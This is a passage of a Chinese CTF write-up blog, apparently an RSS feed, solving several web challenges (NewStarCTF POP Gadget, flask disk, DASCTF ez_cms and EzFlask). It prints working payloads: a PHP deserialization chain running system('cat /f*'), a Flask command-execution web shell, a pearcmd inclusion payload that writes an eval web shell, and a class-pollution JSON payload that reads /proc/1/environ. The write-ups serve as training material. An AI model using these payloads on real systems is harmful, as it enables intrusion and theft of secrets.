class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure><p>分析一下，大致的pop链如下：</p><p><code>Start::__destruct()</code> -&gt; <code>Crypto::__toString()</code> -&gt; <code>Reverse::__get()</code> -&gt; <code>Pwn::__invoke()</code> -&gt; <code>Web::__evil</code></p><p>不过有个问题，die会使整个函数停止运转，说明我们还需要注意绕过一下</p><p>这里的throw涉及到垃圾回收机制（GC回收）</p><p>在php中，当对象被销毁时会自动调用<code>__destruct()</code>，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p><p>当一个类创建之后它会自己消失，而 <code>__destruct()</code>的触发条件就是一个类被销毁时触发，throw回收了自动销毁的类，导致<code>__destruct()</code>检测不到有东西销毁，从而无法触发<code>__destruct()</code>。</p><p>根据这个特性，我们可以提前触发GC回收来抛出异常，从而调用<code>__destruct()</code>。</p><p>这里可以使数组对象为NULL，这样就能提前触发throw</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$start</span>-&gt;errMsg = <span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj = <span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func = <span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj = <span class="variable">$web</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="variable">$start</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到<code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;i:1;i:0;&#125;</code>后把<code>i:1</code>改为<code>i:0</code>，这样就代表数组对象为空，会触发throw，其他就正常执行了 </p><h1 id="NewStarCTF-2023-公开赛道-flask-disk"><a href="#NewStarCTF-2023-公开赛道-flask-disk" class="headerlink" title="[NewStarCTF 2023 公开赛道]flask disk"></a>[NewStarCTF 2023 公开赛道]flask disk</h1><p><code>admin manage</code>一栏需要我们输入pin码，说明flask开启了debug模式，进而说明app.py在被修改后会立刻加载，我们重新编写一个app.py上传rce即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span><br><span class="line">        data = os.popen(cmd).read()        </span><br><span class="line">        <span class="keyword">return</span> data    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span>            </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><img src="/2024/03/29/buuctf/buu2/image-20240424200429359.png" class="" title="image-20240424200429359"><h1 id="DASCTF-2023-amp-0X401七月暑期挑战赛-ez-cms"><a href="#DASCTF-2023-amp-0X401七月暑期挑战赛-ez-cms" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]ez_cms"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]ez_cms</h1><p>根据cms的版本和类型，很容易找到对应靶场</p><p>看了相关介绍，发现cms存在越权漏洞以及sql注入（其实弱密码也有）</p><p>访问<code>/admin</code>登录</p><img src="/2024/03/29/buuctf/buu2/image-20240425153341132.png" class="" title="image-20240425153341132"><p>之前在登陆的时候试了试文件包含，但是没有反应，推测是有过滤或者修改了文件权限什么的？</p><p>尝试下载index.php</p><img src="/2024/03/29/buuctf/buu2/image-20240425154031912.png" class="" title="image-20240425154031912"><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单一入口模式</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误显示</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然存在文件包含，但是猜测flag并不会写在php文件里，有可能在环境变量或者根目录里什么的，先不大费周章地搞这个</p><p>看看能不能下载环境变量的内容</p><img src="/2024/03/29/buuctf/buu2/image-20240425154430677.png" class="" title="image-20240425154430677"><p>发现并不行，感觉像是有权限或者改名称或者换目录？</p><p>在之前的后台系统中，我们发现了一个上传文件的点，看看能不能传:horse:</p><img src="/2024/03/29/buuctf/buu2/image-20240425154923485.png" class="" title="image-20240425154923485"><p>似乎是不可行的（这里我是抓包改名称后才传的:horse:，系统对文件后缀名有检查）</p><p>那就只有文件包含了，这里用pear（怎么最近做题只要有文件包含就有pear）</p><p>之前说过，<code>pearcmd.php</code>默认安装在<code>/usr/local/lib/php</code></p><p>payload就可以很好地进行构造了：<code>../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[&#39;cmd&#39;]);?&gt;+/tmp/shell.php</code>（注意代码中include是自动加了后缀php的）</p><img src="/2024/03/29/buuctf/buu2/image-20240425155944343.png" class="" title="image-20240425155944343"><p>然后就可以rce了</p><img src="/2024/03/29/buuctf/buu2/image-20240425160121697.png" class="" title="image-20240425160121697"><h1 id="DASCTF-2023-amp-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-amp-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>很明显的一个原型链污染</p><p>在这里，<code>open(__file__, &quot;r&quot;).read()</code>是直接返回服务器代码的，我们可以修改<code>__file__</code>来造成任意文件的读取</p><p>这里读取环境变量来构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;username&quot;:&quot;user&quot;,</span><br><span class="line">&quot;password&quot;:&quot;pass&quot;,</span><br><span class="line">&quot;__class__&quot;:&#123;</span><br><span class="line">&quot;check&quot;:&#123;</span><br><span class="line">&quot;__globals__&quot;:&#123;</span><br><span class="line">&quot;__file__&quot;:&quot;proc/1/environ&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;:::warning no-icon&lt;/p&gt;
&lt;p&gt;做题记录如下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://luffys93.github.io/buuctf/buu/&quot;&gt;buu1&lt;/a&gt; -&amp;gt; &lt;a href=&quot;https://luffys93.github.io/buuctf/buu2/&quot;&gt;buu2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;:::&lt;/p&gt;
&lt;p&gt;书接上回&lt;/p&gt;
&lt;h1 id=&quot;NewStarCTF-2023-公开赛道-POP-Gadget&quot;&gt;&lt;a href=&quot;#NewStarCTF-2023-公开赛道-POP-Gadget&quot; class=&quot;headerlink&quot; title=&quot;[NewStarCTF 2023 公开赛道]POP Gadget&quot;&gt;&lt;/a&gt;[NewStarCTF 2023 公开赛道]POP Gadget&lt;/h1&gt;
    
    </summary>
    
    
      <category term="buu平台" scheme="http://luffys93.github.io/categories/buu%E5%B9%B3%E5%8F%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>平台做题记录</title>
    <link href="http://luffys93.github.io/2024/03/27/Scr1w-Platform/sssctf/"/>
    <id>http://luffys93.github.io/2024/03/27/Scr1w-Platform/sssctf/</id>
    <published>2024-03-27T10:08:33.000Z</published>
    <updated>2024-07-31T08:38:32.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ez-json"><a href="#ez-json" class="headerlink" title="*ez_json"></a>*ez_json</h2><span id="more"></span><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span 